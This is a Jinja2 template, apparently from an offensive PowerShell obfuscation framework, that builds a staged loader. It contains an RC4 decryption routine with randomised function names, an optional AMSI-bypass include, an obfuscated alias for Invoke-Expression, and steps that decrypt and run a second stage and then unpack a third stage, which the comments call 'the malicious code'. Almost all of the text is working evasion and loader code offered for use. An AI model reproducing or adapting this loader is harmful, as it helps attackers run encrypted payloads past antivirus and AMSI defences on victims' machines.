{#-
    First, load the RC4 algorithm, define `Decrypt-String` and load and the
    `obfuscate` macro.

    TODO: Include decoy code
-#}

{%- include "powershell/rc4.ps1" -%}

${{symbol_name("KEY")}} = [System.Text.Encoding]::UTF8.GetBytes("{{key}}")

function {{symbol_name("Decrypt-String")}} {[System.Text.Encoding]::UTF8.GetString(({{symbol_name("Decrypt-RC4")}} ([System.Convert]::FromBase64String($args[0])) ${{symbol_name("KEY")}}))};

{%- from 'macros.jinja2' import obfuscate with context -%}

{#-
    Now we can use the `obfuscate` macro.
    Next, load the specified AMSI bypass if one is given
-#}

{% if amsibypass %}{% include amsibypass %}{% endif %}

{% if full -%}
{#- Next, unless AMSI bypass and stage 3 are submitted separately, load stage 2 and then stage 3. Stage 2 defines helper functions such as `Unpack`. -#}

s`Al {{symbol_name("Invoke-Expression")}} {{obfuscate("Invoke-Expression")}}
{{symbol_name("Decrypt-String")}} "{{stage2}}" | {{symbol_name("Invoke-Expression")}};

{# Finally, execute stage 3; i.e. the malicious code. -#}
{%- for code in stage3 -%}
{{symbol_name("Unpack")}} "{{code}}";
{%- endfor -%}
{%- endif -%}
